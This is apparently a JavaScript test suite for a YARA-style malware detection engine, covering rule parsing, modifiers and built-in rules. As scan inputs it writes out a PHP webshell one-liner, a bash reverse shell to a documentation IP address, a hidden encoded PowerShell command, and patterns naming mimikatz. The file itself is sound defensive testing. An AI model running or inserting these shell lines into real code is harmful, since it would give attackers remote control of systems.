// YARA-lite engine — mirrors Katana tests/test_defense.py::TestYara plus extra coverage.
const Y = W.eng.yara;
const B = (s) => Uint8Array.from(Buffer.from(s, "latin1"));
const names = (hits) => hits.map((h) => h.rule);

test("builtins compile and catch a PHP webshell (Katana test_builtins)", () => {
  const rs = Y.builtin();
  assert.ok(rs.length >= 7);
  assert.ok(names(Y.scan(rs, B("<?php system($_GET['c']); ?>"))).includes("Aegis_Webshell_Generic"));
  assert.deepEqual(Y.scan(rs, B("hello world")), []);
});

test("webshell + ransom fixtures", () => {
  const rs = Y.builtin();
  const ws = Y.scan(rs, fixture("yoroi-b-webshell.php", { bin: true }));
  const h = ws.find((x) => x.rule === "Aegis_Webshell_Generic");
  assert.ok(h, "webshell rule hit");
  assert.equal(h.meta.severity, "critical");
  assert.ok(h.strings.some((s) => s.id === "$php1" && s.count === 1 && s.preview.startsWith("system($_POST")));
  assert.ok(names(Y.scan(rs, fixture("yoroi-b-ransom.txt", { bin: true }))).includes("Aegis_Ransom_Note_Traits"));
});

test("features: hex jumps/alternation, wide nocase, xor, uint16, filesize (Katana test_features)", () => {
  const { rules, errors } = Y.compile(String.raw`
rule r { strings: $h = { 4D 5A ?? [1-2] (90|91) } $w = "abc" wide nocase $x = "k" xor
condition: $h at 0 and #w == 1 and $x and uint16(0) == 0x5A4D and filesize < 1KB }`);
  assert.deepEqual(errors, []);
  const data = new Uint8Array([0x4d, 0x5a, 1, 2, 0x90, 0x41, 0, 0x42, 0, 0x43, 0, "k".charCodeAt(0) ^ 0x41]);
  assert.equal(Y.scan(rules, data)[0].rule, "r");
  const e2 = Y.compile('import "pe"\nrule r { condition: pe.is_dll() }').errors;
  assert.ok(e2.some((e) => /module/.test(e)), e2.join("|"));
});

test("invalid rules are reported (Katana yaragen invalid)", () => {
  assert.ok(Y.compile("rule broken { condition: }").errors.length);
  assert.ok(Y.compile("rule a { strings: $a = \"x\" condition: $b }").errors.some((e) => /undefined string \$b/.test(e)));
  assert.ok(Y.compile("rule a { strings: $h = { 4D ZZ } condition: $h }").errors.length);
  assert.ok(Y.compile("rule a { condition: true ").errors.some((e) => /closing brace/.test(e)));
  assert.deepEqual(Y.compile("nothing here").errors, ["no rules found"]);
  assert.equal(Y.validate("rule ok { condition: true }").ok, true);
});

test("N of / all / none / at / in / @ / # / int reads", () => {
  const { rules, errors } = Y.compile(String.raw`
rule two { strings: $a = "foo" $b = "bar" $c = "baz" condition: 2 of them }
rule allr { strings: $a = "foo" $b = "bar" condition: all of ($*) }
rule noner { strings: $a = "zzz" condition: none of them }
rule pos { strings: $a = "bar" condition: $a in (0..10) and @a[1] == 4 and #a == 2 }
rule ints { condition: uint8(0) == 0x66 and uint32be(0) == 0x666f6f20 and int16(0) == 0x6f66 }
rule arith { condition: filesize \ 2 == 6 and filesize % 5 == 2 and filesize * 2 - 4 == 20 }`);
  assert.deepEqual(errors, []);
  const hits = names(Y.scan(rules, B("foo bar bar.")));
  assert.deepEqual(hits.sort(), ["allr", "arith", "ints", "noner", "pos", "two"].sort());
  assert.deepEqual(names(Y.scan(rules, B("foo"))).sort(), ["noner"]);
});

test("nocase / fullword / ascii+wide / regex flags / hex nibbles / not-byte", () => {
  const { rules, errors } = Y.compile(String.raw`
rule fw { strings: $a = "IEX" fullword condition: $a }
rule nc { strings: $a = "MiMiKaTz" nocase condition: $a }
rule wd { strings: $a = "cmd" wide condition: $a }
rule rx { strings: $a = /pass(word)?\s*=\s*\w+/i condition: $a }
rule nib { strings: $a = { 4? ?A ~00 } condition: $a }`);
  assert.deepEqual(errors, []);
  assert.deepEqual(names(Y.scan(rules, B("x IEX(y)"))), ["fw"]);
  assert.deepEqual(names(Y.scan(rules, B("xIEXy"))), []);
  assert.deepEqual(names(Y.scan(rules, B("run mimikatz now"))), ["nc"]);
  assert.deepEqual(names(Y.scan(rules, B("c\0m\0d\0"))), ["wd"]);
  assert.deepEqual(names(Y.scan(rules, B("cmd"))), []);
  assert.deepEqual(names(Y.scan(rules, B("PASSWORD = hunter2"))), ["rx"]);
  assert.deepEqual(names(Y.scan(rules, new Uint8Array([0x41, 0x3a, 0x01]))), ["nib"]);
  assert.deepEqual(names(Y.scan(rules, new Uint8Array([0x41, 0x3a, 0x00]))), []);
});

test("xor range, base64 modifier, escapes in strings", () => {
  const { rules, errors } = Y.compile(String.raw`
rule xr { strings: $a = "This program" xor(0x01-0x10) condition: $a }
rule b6 { strings: $a = "powershell" base64 condition: $a }
rule esc { strings: $a = "a\x00b\tc\"d" condition: $a }`);
  assert.deepEqual(errors, []);
  const x = Buffer.from("This program"); const enc5 = Uint8Array.from(x, (c) => c ^ 5); const enc99 = Uint8Array.from(x, (c) => c ^ 0x99);
  assert.deepEqual(names(Y.scan(rules, enc5)), ["xr"]);
  assert.deepEqual(names(Y.scan(rules, enc99)), []);
  for (const pre of ["", "a", "ab"]) {
    const b64 = Buffer.from(pre + "run powershell now").toString("base64");
    assert.ok(names(Y.scan(rules, B("junk " + b64 + " junk"))).includes("b6"), pre);
  }
  assert.deepEqual(names(Y.scan(rules, B('xa\x00b\tc"dx'))), ["esc"]);
});

test("private + global rules and rule references", () => {
  const { rules, errors } = Y.compile(String.raw`
private rule IsMZ { condition: uint16(0) == 0x5A4D }
rule MZ_With_Url : pe net { meta: severity = "high" strings: $u = "http://" condition: IsMZ and $u }`);
  assert.deepEqual(errors, []);
  const hits = Y.scan(rules, B("MZ....http://evil"));
  assert.deepEqual(names(hits), ["MZ_With_Url"]);   // private rule not reported
  assert.deepEqual(hits[0].tags, ["pe", "net"]);
  assert.equal(hits[0].meta.severity, "high");
  assert.equal(Y.severity(hits[0]), "high");
  const g = Y.compile(String.raw`global rule small { condition: filesize < 10 } rule any1 { condition: true }`).rules;
  assert.deepEqual(names(Y.scan(g, B("tiny"))), ["small", "any1"]);   // global rules report too (unless private)
  assert.deepEqual(names(Y.scan(g, B("this is too big"))), []);
});

test("comments, braces in literals, regex with delimiters, multi-line meta", () => {
  const { rules, errors } = Y.compile(String.raw`
// rule commented_out { condition: true }
/* rule also_out { condition: true } */
rule tricky
{
    meta:
        description = "has { braces } and rule words"
    strings:
        $a = "}{" // trailing comment
        $r = /a\/b{2}/
        $h = { 41 /* A */ 42 // B
               43 }
    condition:
        $a and $r and $h
}`);
  assert.deepEqual(errors, []);
  assert.deepEqual(rules.map((r) => r.name), ["tricky"]);
  assert.equal(rules[0].meta.description, "has { braces } and rule words");
  assert.ok(rules[0].src.startsWith("rule tricky"));
  assert.deepEqual(names(Y.scan(rules, B("}{ a/bb ABC"))), ["tricky"]);
});

test("preview escapes non-printables like Python unicode_escape", () => {
  const { rules } = Y.compile(String.raw`rule p { strings: $a = { 41 0A } condition: $a }`);
  const h = Y.scan(rules, new Uint8Array([0x41, 0x0a, 0xff, 0x5c]));
  assert.equal(h[0].strings[0].preview, "A\\n\\xff\\\\");
  assert.equal(h[0].strings[0].first, 0);
});

test("builtin coverage: EICAR, PE header, reverse shell, encoded powershell, LNK", () => {
  const rs = Y.builtin();
  const eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
  assert.ok(names(Y.scan(rs, B(eicar))).includes("Wkz_EICAR_Test_File"));
  const pe = new Uint8Array(0x100); pe[0] = 0x4d; pe[1] = 0x5a; pe[0x3c] = 0x80; pe.set([0x50, 0x45, 0, 0], 0x80);
  assert.ok(names(Y.scan(rs, pe)).includes("Aegis_PE_In_Non_Executable"));
  assert.ok(names(Y.scan(rs, B("bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"))).includes("Aegis_Reverse_Shell_Script"));
  assert.ok(names(Y.scan(rs, B("powershell.exe -nop -w hidden -enc " + "A".repeat(60)))).includes("Wkz_Encoded_PowerShell_Command"));
  const lnk = new Uint8Array(200); lnk.set([0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0]); lnk.set(Buffer.from("p\0o\0w\0e\0r\0s\0h\0e\0l\0l\0"), 100);
  assert.ok(names(Y.scan(rs, lnk)).includes("Wkz_LNK_Launches_Interpreter"));
});

test("runtime errors are reported per rule, not thrown", () => {
  const { rules } = Y.compile(String.raw`rule ok { condition: true }`);
  rules.push({ uid: -1, name: "bad", tags: [], meta: {}, strings: new Map(), cond: () => { throw new Error("boom"); } });
  const hits = Y.scan(rules, B("x"));
  assert.ok(hits.some((h) => h.rule === "bad" && /boom/.test(h.error)));
  assert.ok(hits.some((h) => h.rule === "ok"));
});
